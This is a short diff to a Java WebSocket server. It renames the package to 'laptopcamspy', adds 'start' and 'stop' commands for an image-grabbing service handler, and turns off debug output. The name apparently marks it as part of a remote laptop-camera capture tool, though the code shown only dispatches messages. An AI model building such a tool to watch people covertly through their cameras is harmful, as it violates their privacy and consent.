@@ -1,4 +1,4 @@
-package com.idoweinstein.websocket;
+package com.widow.laptopcamspy.websocket;
 
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -11,8 +11,8 @@ import org.java_websocket.WebSocketImpl;
 import org.java_websocket.handshake.ClientHandshake;
 import org.java_websocket.server.WebSocketServer;
 
-import com.idoweinstein.servicehandler.GrabImageServiceHandler;
-import com.idoweinstein.servicehandler.IServiceHandler;
+import com.widow.laptopcamspy.servicehandler.GrabImageServiceHandler;
+import com.widow.laptopcamspy.servicehandler.IServiceHandler;
 
 public class ImageWebsocketServer extends WebSocketServer {
 	
@@ -54,7 +54,8 @@ public class ImageWebsocketServer extends WebSocketServer {
 		System.out.println("WebSocket: "+webSocket.getRemoteSocketAddress().toString());
 		System.out.println("Message: "+message);
 		switch(message){
-			case "grab":
+			case "start":
+			case "stop":
 				serviceHandler.handleService(webSocket, message); //TODO: get the service handler from a map with service name - service handler mappings (possible to add multiple service handlers)
 				break;
 		}
@@ -73,7 +74,7 @@ public class ImageWebsocketServer extends WebSocketServer {
 	}
 	
 	public static void main(String[] args) throws IOException, InterruptedException  {
-		WebSocketImpl.DEBUG = true;
+		WebSocketImpl.DEBUG = false;
 		int port = ImageWebsocketServer.WEBSOCKET_PORT; // 843 flash policy port
 		try {
 			port = Integer.parseInt( args[ 0 ] );
